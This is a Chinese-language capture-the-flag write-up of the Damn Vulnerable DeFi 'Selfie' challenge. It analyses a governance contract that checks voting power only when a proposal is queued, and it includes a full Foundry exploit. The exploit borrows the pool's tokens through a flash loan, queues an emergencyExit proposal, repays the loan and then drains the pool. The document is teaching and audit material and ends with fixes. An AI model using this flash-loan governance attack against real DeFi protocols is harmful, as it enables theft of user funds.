# Selfie 

## 一、题目简介

合约基于 **ERC3156 闪电贷** \+ **链上时间锁治理** 实现资金池权限管控。SelfiePool 资金池托管大量带投票权的 ERC20 代币，仅允许通过 SimpleGovernance 治理提案调用 `emergencyExit` 紧急提款函数。治理规则要求提案提交后需等待固定时间方可执行。

题目目标：利用治理投票权校验缺陷 \+ 闪电贷瞬时资产特性，绕过权限校验，窃取资金池内全部代币，并转账至指定 recovery 账户。

## 二、审计扫题视角：漏洞定位

### 2\.1 核心脆弱代码

漏洞横跨 **SimpleGovernance**治理校验逻辑与 **DamnValuableVotes** 投票权统计逻辑，关键脆弱代码逻辑：

1\. 治理提案投票权限校验（仅提案提交瞬间校验，全程仅一次鉴权，核心漏洞点）

```Plain Text
// queueAction：仅提交提案时调用 _hasEnoughVotes 校验投票权，执行阶段无校验
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
    // 【致命漏洞】仅提案提交瞬间校验投票权重
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }
    ...
}

// 投票校验逻辑：读取用户实时当前代币投票权重，无区块快照
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

2\. 提案执行校验逻辑（无二次权限校验，仅校验时间与执行状态）

```Plain Text
// 执行提案仅校验：是否未执行、是否满足时间锁，完全不校验用户投票权
function _canBeExecuted(uint256 actionId) private view returns (bool) {
    GovernanceAction memory actionToExecute = _actions[actionId];
    if (actionToExecute.proposedAt == 0) return false;
    uint64 timeDelta;
    unchecked {
        timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;
    }
    return actionToExecute.executedAt == 0 &amp;&amp; timeDelta &gt;= ACTION_DELAY_IN_SECONDS;
}
```

3\. 资金池高危特权提款函数（仅治理合约可调用，无额外风控）

```Plain Text
// 治理专属紧急提款，调用即可清空池子全部资产
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);
    emit EmergencyExit(receiver, amount);
}
```

### 2\.2 开发者错误默认逻辑

开发者在编写治理模块时，存在多处致命主观默认：

- **默认投票权具备持续性**：认为用户的治理投票代币为长期持仓资产，提交提案后用户不会转出代币

- **默认单次校验足够安全**：仅在提案提交时刻校验投票权，默认提案延时、执行阶段无需二次鉴权

- **默认资产无法瞬时借贷**：忽略闪电贷可以无抵押、瞬时获取大额代币的特性

- **默认治理门槛可靠**：认为高额投票门槛可以拦截恶意用户，未考虑借贷套利绕过门槛

### 2\.3 缺失的关键校验（致命漏判）

标准安全的时间锁治理合约，必须具备**全周期权限校验 \+ 投票快照锁仓**。本合约缺失两大核心校验：

- **缺失投票权快照机制**：没有锁定提案提交高度的投票权重，使用实时余额统计投票

- **缺失提案二次校验**：提案执行时未校验提案发起者当前是否仍持有有效投票权

- **缺失代币锁仓限制**：治理代币无质押、锁仓、冻结机制，瞬时借贷资产可参与治理

本质缺陷：**治理资格只看“提交瞬间”的资产，不看“全程持有”的资产**，闪电贷可以借权提案、还款脱身，实现零成本劫持治理权限。

## 三、通用审计复盘（同类项目要点）

后续审计所有 **闪电贷 \+ 链上治理 \+ 时间锁提案** 项目，优先顶查以下核心点位：

- 治理投票权是否使用**区块快照**，而非实时余额计算

- 提案生命周期：是否仅单次校验权限，提交/延时/执行是否全流程鉴权

- 治理代币是否支持闪电贷借贷，是否无锁仓、无质押门槛

- 特权函数（紧急提款、权限转移）是否依赖可被劫持的治理提案

- 时间锁机制是否仅做延时，无额外身份、资产校验兜底

## 四、漏洞原理总结

SimpleGovernance 治理合约仅在 `queueAction` 提交提案时校验用户投票权重，且投票权重由代币实时余额决定。

攻击者利用 SelfiePool ERC3156 闪电贷，**单次交易内无息借入池子全部治理代币**，临时满足治理提案门槛，提交调用 `emergencyExit` 的恶意提案。

提案提交完成后立刻归还闪电贷，无任何资产成本。等待治理时间锁到期后，无需任何权限、无需持有代币，直接执行提案，调用紧急提款函数清空资金池所有资产。

核心逻辑：**借权提案 → 还款脱权 → 延时执行 → 权限永久生效**。

## 五、EXP  
```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

// 测试合约直接实现闪电贷回调接口，无需嵌套攻击合约
contract SelfieChallenge is Test, IERC3156FlashBorrower {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    // 存储恶意提案ID，用于后续执行
    uint256 public actionId;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(token);
        pool = new SelfiePool(token, governance);
        token.transfer(address(pool), TOKENS_IN_POOL);
        vm.stopPrank();
    }

    function test_selfie() public checkSolvedByPlayer {
        // 1. 发起闪电贷，借入池子全部代币，触发回调攻击逻辑
        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
        // 2. 快进区块时间，绕过治理2天时间锁
        vm.warp(block.timestamp + 2 days);
        // 3. 执行已提交的恶意提案，清空资金池
        governance.executeAction(actionId);
    }

    // 闪电贷核心攻击回调：所有恶意逻辑集中在此
    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        // 劫持瞬时借贷代币的投票权，授权给当前合约
        token.delegate(address(this));
        // 编码恶意调用：调用资金池紧急提款，转账至recovery账户
        bytes memory data = abi.encodeCall(pool.emergencyExit, recovery);
        // 提交恶意治理提案，仅此刻校验投票权，后续无需权限
        actionId = governance.queueAction(address(pool), 0, data);
        // 授权资金池回款，完成闪电贷还款，无借贷违约
        token.approve(address(pool), amount);
        // 满足ERC3156接口校验标准，必须返回固定哈希
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // 题目通关校验
    function _isSolved() private view {
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

```

## 六、做题高频报错汇总（问题）

### 6\.1 逻辑报错：提案执行时间不足

**报错信息**：action is not ready to be executed

**成因**：治理合约要求提案提交后必须等待 2 天，未快进区块时间直接执行提案。

**解决方案**：提案提交完成后，使用`vm.warp(block.timestamp + 2 days)` 跳过时间锁。

### 6\.2 编译/运行报错：闪电贷回调校验失败

**报错信息**：Flash loan callback failed

**成因**：回调函数未返回 ERC3156 标准哈希、或未授权还款导致借贷失败。

**解决方案**：固定返回标准哈希，回调内必须完成 token 还款授权。

### 6\.3 逻辑报错：无治理提案权限

**报错信息**：NotEnoughVotes

**成因**：闪电贷借款、投票委托、提案提交顺序错误，未成功劫持投票权就提交提案。

**解决方案**：严格遵循顺序：闪电贷放款 → 委托投票 → 提交提案 → 授权还款。

### 6\.4 结构报错：嵌套Attacker合约冗余报错

**成因**：传统写法嵌套独立攻击子合约，容易出现权限隔离、prank冲突、上下文失效问题。

**解决方案**：测试合约直接继承闪电贷接口，**彻底取消嵌套合约**，规避所有上下文报错。

## 七、修复方案

针对闪电贷劫持治理投票权漏洞，从权限校验、数据快照、机制限制三层修复：

1. **引入投票区块快照**：治理提案校验**历史区块投票权**，禁止使用当前瞬时余额校验权限，阻断闪电贷借权攻击。

2. **增加二次权限校验**：在 `executeAction` 提案执行阶段，再次校验提案发起者有效投票权。

3. **增加代币锁仓机制**：参与治理投票的代币必须质押锁仓至少治理延时周期，瞬时借贷代币无法参与提案。

4. **权限收紧**：紧急提款等高风险特权函数，增加多签权限兜底，不允许单一治理提案直接调用。
